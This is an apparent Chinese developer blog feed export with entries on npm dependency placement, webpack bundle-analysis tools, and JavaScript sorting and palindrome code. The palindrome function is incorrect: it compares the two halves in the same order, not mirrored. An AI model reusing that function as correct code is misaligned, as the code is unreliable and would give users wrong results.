<li><p> 如果既有开发依赖又有生产依赖，并且不会发布到<code>npm</code>让别人使用。你还是可以随便放。<code>npm install</code> 会安装所有包。但就会产生问题，<strong>生产环境安装了开发环境的包</strong>，这个问题会死人吗？不太清楚，但项目是可以运行的。要避免这些额外的消耗，就要区分两种包的位置。在生产环境中使用<code>npm install --production</code>，则只会安装<code>dependencies</code>中的依赖。外翻篇：如果你开心，也可以把<strong>开发依赖</strong>包放到<code>devDependencies</code>，<strong>生产依赖</strong>包放到<code>dependencies</code>，生产环境就用<code>npm install --only=dev</code>，这样只会安装<code>devDependencies</code>中的<del>生产</del>依赖。</p>
</li>
<li><p> 如果是一个要发布到<code>npm</code>的项目，生产依赖就<strong>一定</strong>要放在<code>dependencies</code>中（缺失会导致运行出错）；开发依赖<strong>应该</strong>放在<code>devDependencies</code>中，这样可以不浪费用户资源，如果放到<code>dependencies</code>中，用户端就会安装很多多余的依赖，浪费大量资源，增加版本冲突概率。</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单总结，当<strong>生产依赖</strong>和<strong>开发依赖</strong>分别放到不同位置时，会导致的问题：</p>
<table>
<thead>
<tr>
<th>玩法</th>
<th>dependencies</th>
<th>devDependencies</th>
<th>内部项目</th>
<th>作为npm包发布</th>
</tr>
</thead>
<tbody><tr>
<td>规范</td>
<td>生产依赖</td>
<td>开发依赖</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>开发依赖放在dependencies中</td>
<td>生产依赖、开发依赖</td>
<td>-</td>
<td>浪费生产环境资源</td>
<td>浪费大量用户资源</td>
</tr>
<tr>
<td>生产依赖放在devDependencies中</td>
<td>-</td>
<td>生产依赖、开发依赖</td>
<td>浪费生产环境资源、部署方式怪异</td>
<td>用户无法正常运行</td>
</tr>
<tr>
<td>反着放</td>
<td>开发依赖</td>
<td>生产依赖</td>
<td>部署方式怪异</td>
<td>浪费大量用户资源、用户无法正常运行</td>
</tr>
</tbody></table>
<p>可以看出，在内部项目中，只要团队能玩得转（也不关心生产环境的资源浪费），可以不用太在意规范。但如果是要发布到npm的项目，甚至是开源项目，就要特别注意。<strong>自己可以乱来，但给用户的，应该是最好的</strong>。</p>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>五种可视化方案分析 webpack 打包性能瓶颈</title>
    <url>/nirvana/webpack/webpack/%E4%BA%94%E7%A7%8D%E5%8F%AF%E8%A7%86%E5%8C%96%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90webpack%E6%89%93%E5%8C%85%E6%80%A7%E8%83%BD%E7%93%B6%E9%A2%88/</url>
    <content><![CDATA[<h3 id="一、测量构建时间"><a href="#一、测量构建时间" class="headerlink" title="一、测量构建时间"></a>一、测量构建时间</h3><p>优化 webpack 构建速度的第一步是知道将精力集中在哪里。我们可以通过 <code>speed-measure-webpack-plugin</code> 测量你的 webpack 构建期间各个阶段花费的时间：</p>
<p><strong>步骤一：安装 speed-measure-webpack-plugin</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install speed-measure-webpack-plugin --save-dev</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p><strong>步骤二：配置</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 分析打包时间</span><br><span class="line">const SpeedMeasurePlugin &#x3D; require(&quot;speed-measure-webpack-plugin&quot;);</span><br><span class="line">const smp &#x3D; new SpeedMeasurePlugin();</span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line">module.exports &#x3D; smp.wrap(prodWebpackConfig)</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-f71fb869cd81189a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>它能够：</p>
<ul>
<li>  分析整个打包总耗时；</li>
<li>  每个插件和 loader 的耗时情况；</li>
</ul>
<p>方便开发人员定位打包耗时瓶颈。</p>
<h3 id="二、分析包内容"><a href="#二、分析包内容" class="headerlink" title="二、分析包内容"></a>二、分析包内容</h3><p>webpack-bundle-analyzer 扫描 bundle 并构建其内部内容的可视化。使用此可视化来查找大的或不必要的依赖项。</p>
<p><strong>步骤一：安装 webpack-bundle-analyzer</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install webpack-bundle-analyzer --save-dev</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p><strong>步骤二：配置</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 分析包内容</span><br><span class="line">const BundleAnalyzerPlugin &#x3D; require(&#39;webpack-bundle-analyzer&#39;).BundleAnalyzerPlugin;</span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    &#x2F;&#x2F; 开启 BundleAnalyzerPlugin</span><br><span class="line">    new BundleAnalyzerPlugin(),</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>一般运行在生产版本中，该插件将在浏览器中打开统计信息结果页面。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-55abc35c2b173da6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><strong>注意：webpack4 在 <code>production</code> 环境下默认启动了 <code>ModuleConcatenationPlugin</code> （预编译所有模块到一个闭包中，提升代码在浏览器中的执行速度），它可能会合并webpack-bundle-analyzer 输出中的模块的一部分，从而使报告不太详细。 如果你使用此插件，请在分析过程中将其禁用。设置如下：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    &#x2F;&#x2F; </span><br><span class="line">    concatenateModules: false,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>具体来说，使用 webpack-bundle-analyzer 能可视化的反映：</p>
<ul>
<li>  打包出的文件中都包含了什么；</li>
<li>  每个文件的尺寸在总体中的占比，哪些文件尺寸大，思考一下，为什么那么大，是否有替换方案，是否使用了它包含的所有代码；</li>
<li>  模块之间的包含关系；</li>
<li>  是否有重复的依赖项，是否存在一个库在多个文件中重复？ 或者捆绑包中是否具有同一库的多个版本？</li>
<li>  是否有相似的依赖库， 尝试使用一种依赖库实现相似的功能。</li>
<li>  每个文件的压缩后的大小。</li>
</ul>
<h3 id="三、在线分析工具"><a href="#三、在线分析工具" class="headerlink" title="三、在线分析工具"></a>三、在线分析工具</h3><p>如果你对在本地安装插件进行测量分析包方式感觉不爽的话，这里将会推荐几款在线测量工具，但都需要 webpack 统计文件。</p>
<h4 id="1-生成统计文件-stats-json"><a href="#1-生成统计文件-stats-json" class="headerlink" title="1. 生成统计文件 stats.json"></a>1. 生成统计文件 <code>stats.json</code></h4><p>使用 webpack 编译源代码时，用户可以生成一个包含有关模块统计信息的 JSON 文件。 这些统计信息可用于分析应用程序的依赖关系图以及优化编译速度。 该文件通常是按以下方式生成的：</p>
<p>在 webpack 启动时带入参数：<code>--profile --json &gt; stats.json</code> ，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">webpack --config webpack.config.prod.js --profile --json &gt; stats.json</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<ul>
<li>  <code>--profile</code>：记录下构建过程中的耗时信息</li>
<li>  <code>--json</code>：以 JSON 的格式输出构建结果，最后只输出一个 <code>.json</code> 文件，这个文件（<code>stats.json</code>）中包括所有构建相关的信息</li>
<li>  <code>&gt; stats.json</code> ：是 UNIX/Linux 系统中的管道命令、含义是把 <code>webpack --profile --json</code> 输出的内容通过管道输出到 <code>stats.json</code> 文件中</li>
</ul>
<p>执行命令后，会在项目中多出一个 <code>stats.json</code> 文件，接下来将 <code>stats.json</code> 文件上传到以下在线工具上，以可视化分析包的组成。</p>
<p>常用的在线工具有：</p>
<ul>
<li>  官方可视化分析工具 Webapck Analyse：生成一个图表，让你可视化了解项目的依赖关系、模块大小及耗时等；</li>
<li>  Webpack Visualizer：生成一个饼状图，可视化 bundle 内容；</li>
<li>  webpack bundle optimize helper：此工具会分析你的 bundle，并为你提供可操作的改进措施建议，以减少 bundle 体积大小。</li>
</ul>
<h4 id="2-官方可视化分析工具-Webapck-Analyse"><a href="#2-官方可视化分析工具-Webapck-Analyse" class="headerlink" title="2. 官方可视化分析工具 Webapck Analyse"></a>2. 官方可视化分析工具 Webapck Analyse</h4><p><a href="http://webpack.github.io/analyse/">Webapck Analyse</a> 是一个在线 Web 应用，它为你提供了对包的更全面的分析，并且它绘制了项目中所有依赖模块的图形，这对于依赖关系较少的项目非常有用。</p>
<p>打开 <a href="http://webpack.github.io/analyse/">Webapck Analyse</a> ，上传 <code>stats.json</code>：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-cdf2f57c826f8d8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>Webpack Analyse 不会把你选择的 <code>stats.json</code> 文件发达到服务器，而是在浏览器本地解析，你不用担心自己的代码为此而泄露。 选择文件后，你马上就能如下的效果图：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-b4a1cc7f4ec92539.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><strong>Modules</strong> ：展示所有的模块，每个模块对应一个文件。并且还包含所有模块之间的依赖关系图、模块路径、模块ID、模块所属 Chunk、模块大小；</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-2cf996c3528f9bcb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><strong>Chunks</strong> ：展示所有的代码块，一个代码块中包含多个模块。并且还包含代码块的ID、名称、大小、每个代码块包含的模块数量，以及代码块之间的依赖关系图；</p>
<p><strong>Assets</strong> ：展示所有输出的文件资源，包括 <code>.js</code>、<code>.css</code>、图片等。并且还包括文件名称、大小、该文件来自哪个代码块；</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-bddc32d51392a614.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><strong>Warnings</strong> ：展示构建过程中出现的所有警告信息；</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-210b137a0478fa88.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><strong>Errors</strong> ：展示构建过程中出现的所有错误信息；<br><img src="https://upload-images.jianshu.io/upload_images/10024246-8a479c1eef699870.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><strong>Hints</strong> ：展示处理每个模块的过程中的耗时。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8f41bdba3a5b0d37.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h4 id="3-Webpack-Visualizer-分析工具"><a href="#3-Webpack-Visualizer-分析工具" class="headerlink" title="3. Webpack Visualizer 分析工具"></a>3. Webpack Visualizer 分析工具</h4><p>可视化并分析您的Webpack捆绑包，以查看哪些模块正在占用空间，哪些可能是重复的。</p>
<p>它既可作为插件使用，也可以在线使用，是一种较新的工具。</p>
<p><strong>方式一：作为插件使用</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install webpack-visualizer-plugin --dev-save</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 分析包内容</span><br><span class="line">const Visualizer &#x3D; require(&#39;webpack-visualizer-plugin&#39;);</span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    &#x2F;&#x2F; 开启 Visualizer</span><br><span class="line">    &#x2F;&#x2F; 默认输出为 stats.html，这里为 statistics.html</span><br><span class="line">    new Visualizer(&#123;</span><br><span class="line">      filename: &#39;.&#x2F;statistics.html&#39;</span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>然后在浏览器中直接打开 <code>statistics.html</code> 就可以看到分析结果了：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-4cecd9f30e511265.gif?imageMogr2/auto-orient/strip"></p>
<p><strong>方式二：在线使用</strong></p>
<p>打开 <a href="http://chrisbateman.github.io/webpack-visualizer/">chrisbateman.github.io/webpack-vis…</a> ，上传 <code>stats.json</code> 既可看到分析结果。</p>
<h4 id="4-webpack-bundle-optimize-helper-分析工具"><a href="#4-webpack-bundle-optimize-helper-分析工具" class="headerlink" title="4. webpack bundle optimize helper 分析工具"></a>4. webpack bundle optimize helper 分析工具</h4><p>打开 <a href="https://webpack.jakoblind.no/optimize/">webpack.jakoblind.no/optimize/</a> ，上传 <code>stats.json</code> 既可看到分析结果及优化建议：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-432920dbb121086a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><p>我们总共介绍了以下 <code>5</code> 种测量工具，每种工具都提供了对包分析的不同视角，例如：</p>
<ul>
<li>  在开发过程中，当向项目引入新包时，我个人经常使用 Webpack Visualizer ，饼状图给出了关于大小的比例的即时反馈；</li>
<li>  在分析每次构建版本的耗时情况时，相对于其它 <code>4</code> 中，<code>speed-measure-webpack-plugin</code> 能够获取每个插件和 loader 的耗时情况，帮助你将注意力集中在需要优化的插件上；</li>
<li>  <code>webpack-bundle-analyzer</code> 能够将 bundle 内容展示为便捷的、交互式、可缩放的树状图形式；</li>
<li>  Webapck Analyse 相对于其它 <code>4</code> 种，能够对包进行全方位的分析；</li>
<li>  相对于其它 <code>4</code> 种，webpack bundle optimize helper 能提供可操作的改进措施建议；</li>
</ul>
<blockquote>
<p>作者：前端瓶子君<br>链接：<a href="https://juejin.cn/post/6844904056985485320">https://juejin.cn/post/6844904056985485320</a></p>
</blockquote>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>冒泡排序</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 冒泡排序基础</span><br><span class="line"> * arry:数组，必传</span><br><span class="line"> * type:排序方式，默认值1，1：升序，0：降序</span><br><span class="line"> **&#x2F;</span><br><span class="line">function bubbleSort(arry,type &#x3D; 1)&#123;</span><br><span class="line">    if(Object.prototype.toString.call(arry) !&#x3D;&#x3D; &#39;[object Array]&#39;)&#123;&#x2F;&#x2F;判断是否数组</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    for (let i&#x3D;0;i&lt;arry.length;i++)&#123;</span><br><span class="line">        for(let j&#x3D;0;j&lt;arry.length-i;j++)&#123;</span><br><span class="line">            if((type &#x3D;&#x3D; 1 &amp;&amp; arry[j]&gt;arry[j+1])||(type &#x3D;&#x3D; 0 &amp;&amp; arry[j]&lt;arry[j+1]))&#123;</span><br><span class="line">                let temp &#x3D; arry[j];</span><br><span class="line">                arry[j] &#x3D; arry[j+1];</span><br><span class="line">                arry[j+1] &#x3D; temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return arry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>判断是否回文</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%9B%9E%E6%96%87/</url>
    <content><![CDATA[<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 判断是否回文</span><br><span class="line">**&#x2F;</span><br><span class="line">function checkPlalindrome(str)&#123;</span><br><span class="line">  if(!str)&#123;&#x2F;&#x2F;为空，或者长度能整除2</span><br><span class="line">    return false</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  let isOdd &#x3D; str.length % 2;</span><br><span class="line">  let mid &#x3D; Math.floor(str.length&#x2F;2);&#x2F;&#x2F;中间数</span><br><span class="line">  let flag &#x3D; true;</span><br><span class="line">  for (let i &#x3D; 0;i&lt;mid;i++)&#123;</span><br><span class="line">    console.log(str.substr(i,1),str.substr(i+mid+isOdd,1))</span><br><span class="line">    if(!(str.substr(i,1) &#x3D;&#x3D; str.substr(i+mid+isOdd,1)))&#123;</span><br><span class="line">      flag &#x3D; false;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>基数排序</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<p>基数排序是一种借助多关键字排序思想对单逻辑关键字进行排序的方法。</p>
<p>所谓的多关键字排序就是有多个优先级不同的关键字。比如说成绩的排序，如果两个人总分相同，则语文高的排在前面，语文成绩也相同则数学高的排在前面。。。如果对数字进行排序，那么个位、十位、百位就是不同优先级的关键字，如果要进行升序排序，那么个位、十位、百位优先级一次增加。<br>基数排序是通过多次的收分配和收集来实现的，关键字优先级低的先进行分配和收集。<br>基数排序是一种非比较型整数排序算法，其原理是将整数按位数切割成不同的数字，然后按每个位数分别比较。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-9e0f7e92428e6637.gif?imageMogr2/auto-orient/strip"></p>
<p>实现代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 基数排序</span><br><span class="line"> * @param &#123;Array&lt;Number&gt;&#125; arry 要排序的数组</span><br><span class="line"> *&#x2F;</span><br><span class="line">function RadixSort(arry) &#123;</span><br><span class="line">    if (arry.length &#x3D;&#x3D; 0) &#123;&#x2F;&#x2F;判断数组不为空</span><br><span class="line">        return [];</span><br><span class="line">    &#125;</span><br><span class="line">    const maxDigit &#x3D; getMaxDigit(getMaxValue(arry));&#x2F;&#x2F;最大数位数</span><br><span class="line">    for (let i &#x3D; 0; i &lt; maxDigit; i++) &#123;</span><br><span class="line">        let count &#x3D; [];</span><br><span class="line">        for (let j &#x3D; 0; j &lt; arry.length; j++) &#123;</span><br><span class="line">            const length &#x3D; &#96;$&#123;arry[j]&#125;&#96;.length;&#x2F;&#x2F;当前数位数</span><br><span class="line">            let bucket &#x3D; 0;</span><br><span class="line">            if (length &gt; i) &#123;&#x2F;&#x2F;当前位数不为空</span><br><span class="line">                bucket &#x3D; parseInt(&#96;$&#123;arry[j]&#125;&#96;.substr(length - i - 1, 1));</span><br><span class="line">            &#125;</span><br><span class="line">            if (!count[bucket]) &#123;</span><br><span class="line">                count[bucket] &#x3D; [];</span><br><span class="line">            &#125;</span><br><span class="line">            count[bucket].push(arry[j]);&#x2F;&#x2F;位数数组填充</span><br><span class="line">        &#125;</span><br><span class="line">        for (let t &#x3D; 0, pos &#x3D; 0; t &lt; count.length; t++) &#123;&#x2F;&#x2F;根据新数组重新排序</span><br><span class="line">            let value &#x3D; null;</span><br><span class="line">            if (count[t]) &#123;</span><br><span class="line">                while ((value &#x3D; count[t].shift()) !&#x3D; null) &#123;</span><br><span class="line">                    arry[pos++] &#x3D; value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        console.log(arry)</span><br><span class="line">    &#125;</span><br><span class="line">    return arry;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 获取数组中最大数</span><br><span class="line"> * @param arry 排序数组</span><br><span class="line"> *&#x2F;</span><br><span class="line">function getMaxValue(arry) &#123;</span><br><span class="line">    let maxValue &#x3D; arry[0];</span><br><span class="line">    for (let i &#x3D; 1; i &lt; arry.length; i++) &#123;</span><br><span class="line">        if (arry[i] &gt; maxValue) &#123;</span><br><span class="line">            maxValue &#x3D; arry[i]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return maxValue;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 整数位数</span><br><span class="line"> * @param value 整数</span><br><span class="line"> *&#x2F;</span><br><span class="line">function getMaxDigit(value) &#123;</span><br><span class="line">    return &#96;$&#123;value&#125;&#96;.length;</span><br><span class="line">&#125;</span><br><span class="line">RadixSort([72, 6, 57, 88, 60, 42, 11183, 73, 1148, 185])</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ 60, 72, 42, 11183, 73, 185, 6, 57, 88, 1148 ]&#x2F;&#x2F;个位排序</span><br><span class="line">[ 6, 42, 1148, 57, 60, 72, 73, 11183, 185, 88 ]&#x2F;&#x2F;十位排序</span><br><span class="line">[ 6, 42, 57, 60, 72, 73, 88, 1148, 11183, 185 ]&#x2F;&#x2F;百位排序</span><br><span class="line">[ 6, 42, 57, 60, 72, 73, 88, 185, 1148, 11183 ]&#x2F;&#x2F;千位排序</span><br><span class="line">[ 6, 42, 57, 60, 72, 73, 88, 185, 1148, 11183 ]&#x2F;&#x2F;万位排序</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>快速排序</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<p>快速排序由于排序效率在同为O(N*logN)的几种排序方法中效率较高，因此经常被采用，再加上快速排序思想—-分治法也确实实用，因此很多软件公司的笔试面试，包括像腾讯，微软等知名IT公司都喜欢考这个。</p>
<p>快速排序是C.R.A.Hoare于1962年提出的一种划分交换排序。它采用了一种分治的策略，通常称其为分治法(Divide-and-ConquerMethod)。</p>
<p>该方法的基本思想是：</p>
<p>1．先从数列中取出一个数作为基准数。<br>2．分区过程，将比这个数大的数全放到它的右边，小于或等于它的数全放到它的左边。<br>3．再对左右区间重复第二步，直到各区间只有一个数。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-3f6f3e05a50e33ae.gif?imageMogr2/auto-orient/strip" alt="一次快排过程"><br>以一个数组作为示例，取区间第一个数为基准数。<br>|0|1|2|3|4|<br>|  —-  | —-  |—-|  —-  | —-  |<br>|<em><strong>6</strong></em>|3|7|4|1|<br>初始时，i = 0;  j = 5;   X = a[i] = 6</p>
<p>由于已经将 a[0] 中的数保存到 X 中，可以理解成在数组 a[0] 上挖了个坑，可以将其它数据填充到这来。</p>
<p>1、从j开始向前找一个比X小或等于X的数。<br>2、当j=4，符合条件，将a[4]挖出再填到上一个坑a[0]中。a[0]=a[4]; i++;  这样一个坑a[0]就被搞定了，但又形成了一个新坑a[4]，这怎么办了？简单，再找数字来填a[4]这个坑。<br>3、这次从i开始向后找一个大于X的数，当i=2，符合条件，将a[2]挖出再填到上一个坑中a[4]=a[2]; j–;<br>数组变为<br>|0|1|2|3|4|<br>|  —-  | —-  |—-|  —-  | —-  |<br>|<strong>1</strong>|3|<strong>7</strong>|4|<strong>7</strong>|<br>i = 2;   j = 4;   X=6<br>4、再重复上面的步骤，先从后向前找，再从前向后找。<br>5、从j开始向前找，当j=3，符合条件，将a[3]挖出填到上一个坑中，a[2] = a[3]; i++;</p>
<p>从i开始向后找，当i=3时，由于i==j退出。</p>
<p>此时，i = j = 3，而a[3]刚好又是上次挖的坑，因此将X填入a[3]。</p>
<p>数组变为：<br>|0|1|2|3|4|<br>|  —-  | —-  |—-|  —-  | —-  |<br>|1|3|4|6|7|</p>
<p>再重复上面的步骤，先从后向前找，再从前向后找。</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 快速排序</span><br><span class="line"> * @param &#123;Array&lt;Number&gt;&#125; arry 要排序的数组</span><br><span class="line"> *&#x2F;</span><br><span class="line">function quickSort(arry, left, right) &#123;</span><br><span class="line">    if (arry.length &#x3D;&#x3D; 0) &#123;&#x2F;&#x2F;判断数组不为空</span><br><span class="line">        return [];</span><br><span class="line">    &#125;</span><br><span class="line">    let [l, r] &#x3D; [left, right];</span><br><span class="line">    if (l &lt; r) &#123;</span><br><span class="line">        let temp &#x3D; arry[l];&#x2F;&#x2F;即arry[l]就是第一个坑</span><br><span class="line">        while (l &lt; r) &#123;</span><br><span class="line">            &#x2F;&#x2F; 从右向左找小于temp的数来填arry[l]</span><br><span class="line">            while (l &lt; r &amp;&amp; arry[r] &gt; temp) &#123;</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">            if (l &lt; r) &#123;</span><br><span class="line">                arry[l] &#x3D; arry[r]; &#x2F;&#x2F;将arry[r]填到arry[l]中，arry[r]就形成了一个新的坑</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; 从左向右找大于temp的数来填arry[r]</span><br><span class="line">            while (l &lt; r &amp;&amp; arry[l] &lt; temp) &#123;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            if (l &lt; r) &#123;</span><br><span class="line">                arry[r] &#x3D; arry[l]; &#x2F;&#x2F;将arry[l]填到arry[r]中，arry[l]就形成了一个新的坑</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        arry[l] &#x3D; temp;&#x2F;&#x2F;将temp填入arry[l]的坑</span><br><span class="line">        console.log(arry, l);</span><br><span class="line">        &#x2F;&#x2F; 递归调用 </span><br><span class="line">        quickSort(arry, left, l - 1);</span><br><span class="line">        quickSort(arry, l + 1, right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quickSort([72, 6, 57, 88, 60, 42, 83, 73, 48, 85], 0, 9);</span><br><span class="line">[ 48, 6, 57, 42, 60, 72, 83, 73, 88, 85 ] 5</span><br><span class="line">&#x2F;&#x2F;第一次排序72为观察数，分界为5；左边都是小于，右边都是大于</span><br><span class="line">[ 42, 6, 48, 57, 60, 72, 83, 73, 88, 85 ] 2</span><br><span class="line">&#x2F;&#x2F;数组左边0-5继续续排序，48为观察数，分界为2</span><br><span class="line">[ 6, 42, 48, 57, 60, 72, 83, 73, 88, 85 ] 1</span><br><span class="line">&#x2F;&#x2F;数组左边0-2继续排序，42为观察数，分界结果为1，</span><br><span class="line">&#x2F;&#x2F;这时再递归发现1&lt;1-1;结束递归，开始右边排序</span><br><span class="line">[ 6, 42, 48, 57, 60, 72, 83, 73, 88, 85 ] 3</span><br><span class="line">&#x2F;&#x2F;右边排序其实是开始于[ 42, 6, 48 , 57, 60, 72, 83, 73, 88, 85 ] 这个数组，57为观察数，排序区间为3-5，发现已经是正序，继续递归上次的右边排序</span><br><span class="line">[ 6, 42, 48, 57, 60, 72, 73, 83, 88, 85 ] 7</span><br><span class="line">&#x2F;&#x2F;右边排序其实是开始于[ 48, 6, 57, 42, 60, 72, 83, 73, 88, 85 ]这个数组基于分界点5的右边数组，83为观察数，排序区间为6-9，排序分界结果为7</span><br><span class="line">[ 6, 42, 48, 57, 60, 72, 73, 83, 85, 88 ] 9</span><br><span class="line">&#x2F;&#x2F;再次递归，右边已正序</span><br></pre></td></tr></table></figure>
<h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><p>时间复杂度：O(nlogn)<br>空间复杂度：快速排序使用递归，递归使用栈，因此它的空间复杂度为O(logn)<br>稳定性：快速排序无法保证相等的元素的相对位置不变，因此它是不稳定的排序算法</p>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>插入排序算法</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>插入排序不是通过交换位置而是通过比较找到合适的位置插入元素来达到排序的目的的。<br>举个栗子，对5,3,8,6,4这个无序序列进行简单插入排序，首先假设第一个数的位置时正确的。然后3要插到5前面，把5后移一位，变成3,5,8,6,4。然后8不用动，6插在8前面，8后移一位，4插在5前面，从5开始都向后移一位。<br>注意在插入一个数的时候要保证这个数前面的数已经有序。<br>简单插入排序的时间复杂度也是O(n^2)。</p>
